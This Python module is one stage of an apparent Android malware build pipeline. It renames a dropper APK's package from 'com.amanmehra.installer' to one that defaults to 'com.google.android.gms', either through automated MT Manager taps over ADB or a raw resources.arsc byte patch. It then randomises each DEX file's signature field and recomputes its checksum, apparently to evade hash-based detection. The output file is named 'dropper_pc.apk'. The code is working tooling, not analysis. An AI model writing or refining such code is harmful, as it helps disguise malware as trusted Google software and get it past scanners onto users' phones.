"""Phase 5: MT Manager ARSC Cleanup — PRIMARY: MT Manager (Android app).

Architecture:
  PRIMARY:  Android MT Manager app — real ARSC editor, proper binary parsing.
  FALLBACK: PC binary byte patch (risky, may break APK).

PC only:
  - File transfer (ADB push/pull)
  - Hex Editor DEX magic (zip-level)
  - Fallback binary patch

Android does:
  - ARSC Editor: Search old_pkg → Replace All → Save
"""
import os, subprocess, shutil, zipfile, random, zlib, struct
from config import TEMP_DIR
from utils.logger import setup_logger

logger = setup_logger()


def _hex_dex_magic(apk_path, out_apk):
    """Hex Editor — DEX magic + valid Adler32 + SHA1."""
    with zipfile.ZipFile(apk_path, 'r') as zin:
        with zipfile.ZipFile(out_apk, 'w', zipfile.ZIP_DEFLATED) as zout:
            for info in zin.infolist():
                data = zin.read(info.filename)
                if info.filename.endswith('.dex') and len(data) > 40:
                    dex = bytearray(data)
                    if dex[:4] == b'dex\n':
                        dex[4:8] = b'037\x00'
                        checksum = zlib.adler32(bytes(dex[12:])) & 0xffffffff
                        dex[8:12] = struct.pack('<I', checksum)
                        dex[12:32] = bytes(random.randint(0, 255) for _ in range(20))
                        data = bytes(dex)
                zout.writestr(info, data)
    logger.info("[+] Hex Editor done")


def _fallback_pc_arsc_cleanup(hardened_apk, output_apk, old_pkg, new_pkg):
    """FALLBACK: PC binary patch of resources.arsc.

    WARNING: This is risky. MT Manager does proper ARSC parsing.
    This fallback may break the APK. Use Android MT Manager when possible.
    """
    logger.info("[*] FALLBACK: PC binary ARSC patch (risky — use Android MT Manager)")

    # Extract, patch, repack
    import tempfile
    with tempfile.TemporaryDirectory() as td:
        # Extract APK
        import zipfile
        extracted = os.path.join(td, "extracted")
        os.makedirs(extracted, exist_ok=True)
        with zipfile.ZipFile(hardened_apk, 'r') as z:
            z.extractall(extracted)

        # Patch resources.arsc
        arsc = os.path.join(extracted, 'resources.arsc')
        if os.path.exists(arsc):
            with open(arsc, 'rb') as f:
                data = bytearray(f.read())
            old_b = old_pkg.encode('utf-8')
            new_b = new_pkg.encode('utf-8')
            if len(new_b) < len(old_b):
                new_b = new_b + b'\x00' * (len(old_b) - len(new_b))
            idx = 0
            count = 0
            while True:
                idx = data.find(old_b, idx)
                if idx == -1:
                    break
                data[idx:idx + len(old_b)] = new_b[:len(old_b)]
                count += 1
                idx += len(old_b)
            with open(arsc, 'wb') as f:
                f.write(data)
            if count > 0:
                logger.info(f"[+] ARSC patched: {count} occurrences")

        # Repack
        with zipfile.ZipFile(output_apk, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(extracted):
                for f in files:
                    fp = os.path.join(root, f)
                    arcname = os.path.relpath(fp, extracted)
                    zout.write(fp, arcname)

    logger.info(f"[+] Fallback ARSC cleanup complete: {output_apk}")
    return output_apk


def _android_mt_manager_arsc(hardened_apk, output_apk, old_pkg, new_pkg):
    """PRIMARY: Use REAL MT Manager on Android device for ARSC cleanup.

    Steps:
      1. ADB push hardened_apk → /sdcard/mt_input.apk
      2. Launch MT Manager app
      3. ADB tap ARSC Editor → Search → Replace All → Save
      4. ADB pull /sdcard/mt_output.apk → output_apk
    """
    logger.info("[*] PRIMARY: Real MT Manager on Android (ARSC cleanup)")

    try:
        from android_automation.mt_manager_automation import run_mt_manager_arsc_cleanup
        from android_automation.adb_ui import is_device_connected

        if not is_device_connected():
            logger.info("[!] No Android device connected")
            return None

        success = run_mt_manager_arsc_cleanup(hardened_apk, output_apk, old_pkg, new_pkg)
        if success and os.path.exists(output_apk) and os.path.getsize(output_apk) > 0:
            logger.info(f"[+] REAL MT Manager ARSC cleanup complete: {output_apk}")
            return output_apk
        else:
            logger.warning("[!] MT Manager ARSC automation failed")
            return None

    except Exception as e:
        logger.warning(f"[!] MT Manager ARSC automation error: {e}")
        return None


def run(hardened_apk, base_info=None):
    """Phase 5: MT Manager ARSC Cleanup — PRIMARY.

    Flow:
      1. Try REAL MT Manager on Android → if success, apply hex editor, return
      2. If no Android or failure → FALLBACK PC binary patch
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 5: MT Manager ARSC Cleanup (PRIMARY)")
    logger.info("=" * 60)

    base_pkg = base_info.get('name', 'com.google.android.gms') if base_info else 'com.google.android.gms'
    old_pkg = 'com.amanmehra.installer'

    output_apk = str(TEMP_DIR / "dropper_pc.apk")

    # PRIMARY: Real MT Manager on Android
    android_result = _android_mt_manager_arsc(hardened_apk, output_apk, old_pkg, base_pkg)
    if android_result:
        # Apply hex editor on top
        hexed = str(TEMP_DIR / "dropper_pc_hexed.apk")
        _hex_dex_magic(output_apk, hexed)
        shutil.copy(hexed, output_apk)
        logger.info(f"[+] Phase 5 (ANDROID) Complete: {output_apk}")
        return output_apk

    # FALLBACK: PC binary patch
    logger.info("[*] Switching to PC fallback mode...")
    _fallback_pc_arsc_cleanup(hardened_apk, output_apk, old_pkg, base_pkg)

    # Hex Editor
    hexed = str(TEMP_DIR / "dropper_pc_hexed.apk")
    _hex_dex_magic(output_apk, hexed)
    shutil.copy(hexed, output_apk)

    logger.info(f"[+] Phase 5 (PC FALLBACK) Complete: {output_apk}")
    return output_apk
